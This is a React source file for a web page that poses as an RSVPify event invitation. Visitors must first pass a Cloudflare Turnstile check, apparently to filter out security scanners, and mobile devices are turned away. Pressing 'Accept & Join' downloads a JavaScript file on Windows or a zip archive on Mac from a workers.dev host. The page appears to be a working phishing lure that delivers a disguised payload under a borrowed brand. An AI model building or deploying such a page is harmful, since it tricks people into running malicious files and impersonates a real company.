import React, { useState, useEffect } from 'react';
import Turnstile from 'react-turnstile';
import './App.css';

// Replace this with your Cloudflare Turnstile site key
const TURNSTILE_SITE_KEY = '0x4AAAAAAE1PdO04PULzOibL';

export default function App() {
  const [isVerified, setIsVerified] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    // Always start fresh - force Turnstile on every reload
    sessionStorage.removeItem('turnstile_verified');
  }, []);

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // If not verified, show Turnstile gate (blocks everything)
  if (!isVerified) {
    return <TurnstileGate onVerified={() => setIsVerified(true)} />;
  }

  if (isMobile)
  {
    return <MobileBlocker />;
  }

  return <Invite />;
}

function TurnstileGate({ onVerified }) {
  const [error, setError] = useState(null);
  const [turnstileToken, setTurnstileToken] = useState(null);

  const handleTurnstileSuccess = (token) => {
    setTurnstileToken(token);
    setError(null);
    // Automatically verify and proceed
    sessionStorage.setItem('turnstile_verified', 'true');
    onVerified();
  };

  const handleTurnstileError = () => {
    setError('Verification failed. Please try again.');
    setTurnstileToken(null);
  };

  const handleTurnstileExpire = () => {
    setError('Verification expired. Please complete again.');
    setTurnstileToken(null);
  };

  return (
    <div className="turnstile-gate-container">
      <div className="turnstile-gate-overlay"></div>
      <div className="turnstile-gate-content">
        <div className="turnstile-gate-box">
          <h2 className="turnstile-gate-title">Verify Your Access</h2>
          <p className="turnstile-gate-subtitle">
            Please complete the verification to continue
          </p>

          <div className="turnstile-gate-widget">
            <Turnstile
              sitekey={TURNSTILE_SITE_KEY}
              onSuccess={handleTurnstileSuccess}
              onError={handleTurnstileError}
              onExpire={handleTurnstileExpire}
              theme="light"
              size="normal"
            />
          </div>

          {error && (
            <p className="turnstile-gate-error">{error}</p>
          )}

          <p className="turnstile-gate-info">
            🔒 This site is protected by Cloudflare Turnstile
          </p>
        </div>
      </div>
    </div>
  );
}

function Invite() {
  const handleDownload = () => {
    const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;

    if (isWindows)
    {
      // Replace with your Windows download URL
      window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Exclusive-Event-Invite.js';
    } else
    {
      // Replace with your Mac download URL
      window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Event-Invite.zip';
    }
  };

  return (
    <>
      <div className="wrapper">
        <div className="container">
          <div className="envelope-section">
            <div className="envelope">📬</div>
          </div>
          <div className="content-section">
            <div className="logo">
              <img
                src="https://cdn.prod.website-files.com/5eabf935dc211f5fa80b51e8/6480577cae8766a35c9adea2_ETTF7MWT0RrWO82en5FCUDylkmbmtOYrqJgET2CgPVA.svg"
                alt="RSVPify"
              />
            </div>

            <h1>You're Invited</h1>
            <p className="subtitle">Experience something extraordinary</p>

            <div className="header-divider"></div>

            <p className="invite-text">
              We're thrilled to invite you to join us for an exclusive event.<br />
              <span className="highlight">Please accept this invitation and be part of something special.</span>
            </p>

            <button className="accept-btn" onClick={handleDownload}>
              Accept & Join
            </button>
          </div>
        </div>
      </div>

      <footer className="web-footer">
        <p>Exclusive event invitation crafted with precision</p>
        <div className="web-footer-divider"></div>
        <p>© 2026 RSVPify. All rights reserved.</p>
      </footer>
    </>
  );
}

function MobileBlocker() {
  return (
    <div className="mobile-warning-container">
      <div className="mobile-bg-decoration">
        <div className="decoration-circle circle-1"></div>
        <div className="decoration-circle circle-2"></div>
        <div className="decoration-circle circle-3"></div>
      </div>

      <div className="mobile-content-wrapper">
        <div className="mobile-icon-wrapper">
          <div className="mobile-icon">🖥️</div>
        </div>

        <div className="mobile-logo">
          <img
            src="https://rsvpify.com/wp-content/uploads/2025/08/Logo-RSVPify.svg"
            alt="RSVPify"
          />
        </div>

        <h1 className="mobile-title">Desktop Only</h1>

        <p className="mobile-subtitle">
          This exclusive invitation deserves to be experienced on a bigger screen.
        </p>

        <div className="mobile-divider"></div>

        <div className="mobile-features">
          <div className="feature-item">
            <span className="feature-icon">💻</span>
            <span>Windows</span>
          </div>
          <div className="feature-item">
            <span className="feature-icon">🍎</span>
            <span>macOS</span>
          </div>
          <div className="feature-item unavailable">
            <span className="feature-icon">📱</span>
            <span>Mobile</span>
          </div>
        </div>

        <p className="mobile-message">
          Open this from your desktop or laptop to continue
        </p>

        <div className="mobile-footer-art">
          <p>✨ A premium experience awaits</p>
        </div>
      </div>
    </div>
  );
}
